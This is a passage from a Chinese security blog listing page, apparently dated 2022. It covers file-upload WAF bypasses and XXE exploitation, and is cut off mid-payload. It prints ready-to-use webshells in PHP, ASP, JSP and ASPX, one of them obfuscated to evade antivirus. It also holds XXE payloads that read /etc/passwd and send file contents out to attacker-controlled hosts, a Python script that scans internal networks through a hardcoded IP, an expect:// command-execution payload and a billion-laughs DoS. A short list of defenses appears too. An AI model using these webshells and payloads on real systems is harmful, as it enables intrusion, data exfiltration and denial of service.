<h5 id="filename-绕过"><a href="#filename-绕过" class="headerlink" title="filename 绕过"></a>filename 绕过</h5><p>针对早期版本安全狗，可以多加一个 filename 在一个 Content-Disposition 中，存在多个 filename ，协议解析应该使用最 后的filename 值作为文件名。如果 WAF 解析到 filename&#x3D;”bk.jpg”认为解析 到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是 bk.asp。</p>
<pre><code>Content-Disposition: form-data; name=&quot;file1&quot;;

filename=&quot;bk.jpg&quot;;filename=&quot;bk.asp&quot;
</code></pre>
<h5 id="修改-Content-Disposition-字段值的大小写绕过"><a href="#修改-Content-Disposition-字段值的大小写绕过" class="headerlink" title="修改 Content-Disposition 字段值的大小写绕过"></a>修改 Content-Disposition 字段值的大小写绕过</h5><pre><code>Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;bk.php&quot;
</code></pre>
<p>改成</p>
<pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.php
</code></pre>
<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name&#x3D;”  file1”;</p>
<p>filename&#x3D;”bk……………………………………………………………………………………………………..</p>
<p>………………………………………………………………………………………………asp”大概几百个点。</p>
<h5 id="删除-Content-Disposition-值的-form-data-绕过"><a href="#删除-Content-Disposition-值的-form-data-绕过" class="headerlink" title="删除 Content-Disposition 值的 form-data 绕过"></a>删除 Content-Disposition 值的 form-data 绕过</h5><p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。</p>
<pre><code>Content-Disposition: form-data; name=&quot;file1&quot;; filename= &quot;bk.php&quot;
</code></pre>
<p>改为：</p>
<pre><code>Content-Disposition: name=&quot;file1&quot;; filename= &quot;bk.php
</code></pre>
<h3 id="文件上传中的目录穿越漏洞"><a href="#文件上传中的目录穿越漏洞" class="headerlink" title="文件上传中的目录穿越漏洞"></a>文件上传中的目录穿越漏洞</h3><p>形式：上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p>
<p>绕过：上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p>
<h4 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码"></a>常用攻击代码</h4><blockquote>
<p>简单的一句话木马</p>
<pre><code class="text">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;
</code></pre>
<p>绕过<code>&lt;?</code>限制的一句话木马</p>
<pre><code class="text">&lt;script language = &#39;php&#39;&gt;@eval($_POST[cmd]);&lt;/script&gt;
</code></pre>
<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
<pre><code class="text">&lt;?= @eval($_POST[&#39;cmd&#39;]);
</code></pre>
<p>asp一句话木马</p>
<pre><code class="text">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;
</code></pre>
<p>JSP一句话木马</p>
<pre><code class="text">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;
</code></pre>
<p>JSP一句话免杀（ASCLL编码）</p>
<pre><code class="text">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;
&lt;%
    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;
        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));
        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);
    &#125;
%&gt;
</code></pre>
<p>ASPX一句话</p>
<pre><code class="text">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;
</code></pre>
</blockquote>
<h4 id="其它攻击代码"><a href="#其它攻击代码" class="headerlink" title="其它攻击代码"></a>其它攻击代码</h4><blockquote>
<p>异或取反等操作写shell的php脚本、混淆木马、不死马</p>
</blockquote>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ul>
<li>文件扩展名服务端白名单效验</li>
<li>文件内容服务端效验</li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
</ul>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="1-服务器配置不当"><a href="#1-服务器配置不当" class="headerlink" title="1.服务器配置不当:"></a>1.服务器配置不当:</h3><p>重新配置好服务器。服务器PUT方法配置不当。</p>
<h3 id="2-开源编辑器上传漏洞"><a href="#2-开源编辑器上传漏洞" class="headerlink" title="2. 开源编辑器上传漏洞:"></a>2. 开源编辑器上传漏洞:</h3><p>若新版编辑器已修复漏洞，请更新编辑器版本。</p>
<h3 id="3-本地文件上传限制被绕过"><a href="#3-本地文件上传限制被绕过" class="headerlink" title="3.本地文件上传限制被绕过:"></a>3.本地文件上传限制被绕过:</h3><p>在服务器后端对上传的文件迚行过滤。</p>
<h3 id="4-设置文件上传的目录设置为不可执行"><a href="#4-设置文件上传的目录设置为不可执行" class="headerlink" title="4.设置文件上传的目录设置为不可执行"></a>4.设置文件上传的目录设置为不可执行</h3><p>只要web容器无法解析该目录下面的文件，卲使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
<h3 id="5-判断文件类型"><a href="#5-判断文件类型" class="headerlink" title="5.判断文件类型"></a>5.判断文件类型</h3><p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
<h3 id="6-使用随机数改写文件名和文件路径"><a href="#6-使用随机数改写文件名和文件路径" class="headerlink" title="6.使用随机数改写文件名和文件路径"></a>6.使用随机数改写文件名和文件路径</h3><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p>
<h3 id="7-单独设置文件服务器的域名"><a href="#7-单独设置文件服务器的域名" class="headerlink" title="7.单独设置文件服务器的域名"></a>7.单独设置文件服务器的域名</h3><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
    </div>
    <a href="/2022/08/24/九，文件上传漏洞/" class="go-post">
        阅读全文
    </a>
</div>

<div class="post">
    <a href="/2022/08/24/二，xxe漏洞/">
        <h2>
            
        </h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/8/24
        </span>
    </div>
    <div class="excerpt">
        <div class="content" v-pre>
            
            <h1 id="二，xxe漏洞"><a href="#二，xxe漏洞" class="headerlink" title="二，xxe漏洞"></a>二，xxe漏洞</h1><p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
<p>在某些情况下，攻击者可以通过利用 XXE 漏洞执行服务器端请求伪造(SSRF) 攻击 来升级 XXE 攻击以破坏底层服务器或其他后端基础设施。</p>
<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>XXE(XML External Entity Injection) XML外部实体注入，XML是一种类似于HTML（超文本标记语言）的可扩展标记语言，是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
<p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p>
<p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>
<p><strong>DTD通过在xml文档开头的DOCTYPE声明</strong></p>
<h3 id="内部DOCTYPE声明"><a href="#内部DOCTYPE声明" class="headerlink" title="内部DOCTYPE声明"></a>内部DOCTYPE声明</h3><p>格式：&lt;!DOCTYPE 根元素 [元素声明]&gt;</p>
<p>带有 DTD 的 XML 文档实例：</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [							##定义此文档是note类型文档
&lt;!ELEMENT note (to,from,heading,body)&gt;		##定义note有四个元素：to，from，heading，body
&lt;!ELEMENT to      (#PCDATA)&gt;				##定义元素to是&quot;#PCDATA&quot;类型
&lt;!ELEMENT from    (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;George&lt;/to&gt;
&lt;from&gt;John&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre>
<h3 id="外部DOCTYPE声明"><a href="#外部DOCTYPE声明" class="headerlink" title="外部DOCTYPE声明"></a>外部DOCTYPE声明</h3><p>格式：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;</p>
<p>带有外部 DTD 的 XML 文档实例：</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
&lt;note&gt;
&lt;to&gt;George&lt;/to&gt;
&lt;from&gt;John&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre>
<p>被包含的note.dtd文件：</p>
<pre><code class="dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;
</code></pre>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>实体：</p>
<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可在内部或外部进行声明。</p>
<h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><p>格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
<p>eg：</p>
<p>DTD</p>
<pre><code class="dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
</code></pre>
<p>xml</p>
<pre><code class="xml">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre>
<p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>格式：&lt;!ENTITY 实体名称 SYSTEM “URI&#x2F;URL”&gt;</p>
<p>eg:</p>
<p>DTD</p>
<pre><code class="dtd">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
</code></pre>
<p>xml</p>
<pre><code class="xml">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre>
<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
<p>eg：</p>
<pre><code class="dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; 
%an-element; %remote-dtd;
</code></pre>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>抓包查找漏洞点</strong></p>
<p>Content-Type是xml，或者post数据为json，xml</p>
<p><strong>源码查找xml解释器</strong></p>
<p>svg图片上传点</p>
<p>post-Office 2007 文件（实际上只是 XML 文档的 zip 文件）上传点</p>
<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><p>抓包修改可疑包，发送xml实体，如果返回我们想要的数据，基本可以确定存在xml漏洞</p>
<p>检测xml是否会被解析：</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;]&gt;&lt;root&gt;&amp;words;&lt;/root&gt;
</code></pre>
<p>检测是否支持DTD引用外部实体：</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;%name;]&gt;
</code></pre>
<p>查看服务器日志可以知道是否被利用</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="有回显文件读取"><a href="#有回显文件读取" class="headerlink" title="有回显文件读取"></a>有回显文件读取</h3><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;
%file;
]&gt;
&lt;test&gt;&amp;hack;&lt;/test&gt;
</code></pre>
<pre><code class="xml-dtd">&lt;!-- hack.dtd --&gt;
&lt;!ENTITY hack SYSTEM &#39;file:///etc/passwd&#39;&gt;
</code></pre>
<p>使用协议进行读取</p>
<p>ps：</p>
<p>不同的程序xml支持不同的协议</p>
<table>
<thead>
<tr>
<th>LIBXML2</th>
<th>PHP</th>
<th>JAVA</th>
<th>.NET</th>
</tr>
</thead>
<tbody><tr>
<td>file</td>
<td>file</td>
<td>http</td>
<td>file</td>
</tr>
<tr>
<td>http</td>
<td>http</td>
<td>https</td>
<td>http</td>
</tr>
<tr>
<td>ftp</td>
<td>ftp</td>
<td>ftp</td>
<td>https</td>
</tr>
<tr>
<td></td>
<td>php</td>
<td>file</td>
<td>ftp</td>
</tr>
<tr>
<td></td>
<td>compress.zlib</td>
<td>jar</td>
<td></td>
</tr>
<tr>
<td></td>
<td>compress.bzip2</td>
<td>netdoc</td>
<td></td>
</tr>
<tr>
<td></td>
<td>data</td>
<td>mailto</td>
<td></td>
</tr>
<tr>
<td></td>
<td>glob</td>
<td>gopher*</td>
<td></td>
</tr>
<tr>
<td></td>
<td>phar</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>如果程序安装扩展的话会支持更多协议。</p>
<p><img src="/%E4%BA%8C%EF%BC%8Cxxe%E6%BC%8F%E6%B4%9E.assets/image-20220325084151821.png" alt="image-20220325084151821"></p>
<p>但是，如果我们读取的文件内容有太多符号（如：&amp;,&lt;,&gt;,”,’）导致被解析引擎解析报错，我们无法得到想要的文件内容。这时就要靠CDATA</p>
<h4 id="XInclude读取文件"><a href="#XInclude读取文件" class="headerlink" title="XInclude读取文件"></a>XInclude读取文件</h4><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。当客户端提交的数据被放入后端 SOAP 请求中时，就会出现这种情况的一个示例，该请求随后由后端 SOAP 服务处理。</p>
<p>在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改<code>DOCTYPE</code>元素。但是，您也许可以<code>XInclude</code>改用。<code>XInclude</code>是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以<code>XInclude</code>在 XML 文档中的任何数据值中进行攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击</p>
<pre><code class="xml-dtd">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
</code></pre>
<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>格式：&lt; ! [ CDATA ［忽略检查的文本］］&gt;</p>
<p>在CDATA中将文本的内容写入，那么这段文本内容会被忽略检查，无论里面是否包含XML敏感内容，全部被当作普通的文本去看待。</p>
<p>需要注意的是，CDATA的文本内容中不能出现字符串“]]&gt;”，也不能嵌套。</p>
<p>我们希望读取的内容写在CDATA里，但由于CDATA不允许嵌套，所以我们只能通过多个实体拼接，拼接后再在xml中调用。（注意，不能在xml中直接拼接，应当是拼接后在xml中调用！！，所以不应当用通用实体而是用参数实体）</p>
<p>eg：</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
%dtd; ]&gt; 

&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
</code></pre>
<p>evil.dtd</p>
<pre><code class="dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre>
<h3 id="无回显文件读取"><a href="#无回显文件读取" class="headerlink" title="无回显文件读取"></a>无回显文件读取</h3><h4 id="OOB外带"><a href="#OOB外带" class="headerlink" title="OOB外带"></a>OOB外带</h4><p>如果我们插入的xml实体被执行，但不提供回显该怎么办？</p>
<p>test.dtd</p>
<pre><code class="xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;
</code></pre>
<p>payload</p>
<pre><code class="xml-dtd">&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
</code></pre>
<p>整个payload的思路就是执行%remote实体让服务器去访问我们的vps服务器上的test.dtd，然后执行%int实体，%int实体会调用%file实体读取服务器本地文件，base64编码后将结果添入%int实体中的%send作为发包参数（因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;）,最后调用%send实体将读取到的数据发送到我们的vps的9999端口。</p>
<p>这种方法很像ssrf，不是吗？</p>
<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的 url并将泄露文件内容放在url中，通过这样的方式返回数据,所以和OOB的构造方式几乎只有url出不同， 其他地方相同。</p>
<h5 id="通过引入服务器文件"><a href="#通过引入服务器文件" class="headerlink" title="通过引入服务器文件"></a>通过引入服务器文件</h5><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-
encode/resource=file:///flag&quot;&gt;
%remote;
%send;
]&gt;
&lt;message&gt;1234&lt;/message&gt;
</code></pre>
<pre><code>&lt;!-- xml.dtd --&gt;
&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:///hhhhhhh/%file;&#39;&gt;&quot;&gt;
%start;
</code></pre>
<h5 id="通过引入本地文件"><a href="#通过引入本地文件" class="headerlink" title="通过引入本地文件"></a>通过引入本地文件</h5><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个 系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一 些实体内容就行。</p>
<p>ubuntu系统自带的<code>/usr/share/yelp/dtd/docbookx.dtd</code></p>
<p>我们可以在内部重写一个该dtd文件中含有的参数实体，而此时调用是在外部，这样仍然可以实现</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-
encode/resource=file:///flag&quot;&gt;
&lt;!ENTITY % ISOamso &#39;
&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM
&amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
&amp;#x25;eval;
&amp;#x25;send;
&#39;&gt;
%remote;
]&gt;
&lt;message&gt;1234&lt;/message&gt;
</code></pre>
<p>其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的<code>%</code>编码，第三层就需要在第二层的基础上将所有<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> html编码。</p>
<p>第一个调用的参数实体是%remote，在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd文件中调用了%ISOamso;， 在ISOamso定义的实体中相继调用了eval、和send</p>
<h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><p>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个 检查。几乎所有XML解析器能够发现如下这种两层嵌套式</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
%start;
%send;
]&gt;
&lt;message&gt;1234&lt;/message&gt;
</code></pre>
<h5 id="基于报错的三层嵌套参数实体XXE"><a href="#基于报错的三层嵌套参数实体XXE" class="headerlink" title="基于报错的三层嵌套参数实体XXE"></a>基于报错的三层嵌套参数实体XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
&lt;!ELEMENT message ANY&gt;
&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
&lt;!ENTITY % para &#39;
&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM
&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
&amp;#x25;para2;
&#39;&gt;
%para;
]&gt;
&lt;message&gt;1234&lt;/message&gt;
</code></pre>
<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>的确，xxe就是一种特殊的ssrf攻击，ssrf可以做到的，xxe基本也可以做到</p>
<h4 id="http内网主机探测"><a href="#http内网主机探测" class="headerlink" title="http内网主机探测"></a>http内网主机探测</h4><p>尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件可以确定大致扫描方向</p>
<p>一个批量探测内网的脚本示例：</p>
<pre><code class="python">import requests
import base64

#Origtional XML that the server accepts
#&lt;xml&gt;
#    &lt;stuff&gt;user&lt;/stuff&gt;
#&lt;/xml&gt;


def build_xml(string):
    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
    send_xml(xml)

def send_xml(xml):
    headers = &#123;&#39;Content-Type&#39;: &#39;application/xml&#39;&#125;
    x = requests.post(&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;, data=xml, headers=headers, timeout=5).text
    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = &#39;10.0.0.&#39; + i
        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;
        print string
        build_xml(string)
    except:
continue
</code></pre>
<h4 id="http内网端口扫描"><a href="#http内网端口扫描" class="headerlink" title="http内网端口扫描"></a>http内网端口扫描</h4><p>只需固定ip然后对端口进行循环探测即可</p>
<p>或者用bp配合扫描</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用 导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程 序上，那么我们就可以执行如下的命令： 以下代码将尝试与端口8080通信，根据响应时间&#x2F;长度，攻击者将可以判断该端口是否已被开启</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;catalog&gt;
&lt;core id=&quot;test101&quot;&gt;
&lt;author&gt;John, Doe&lt;/author&gt;
&lt;title&gt;I love XML&lt;/title&gt;
&lt;category&gt;Computers&lt;/category&gt;
&lt;price&gt;9.99&lt;/price&gt;
&lt;date&gt;2021-10-01&lt;/date&gt;
&lt;description&gt;&amp;xxe;&lt;/description&gt;
&lt;/core&gt;
&lt;/catalog&gt;
</code></pre>
<p>响应：</p>
<pre><code>&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...
</code></pre>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
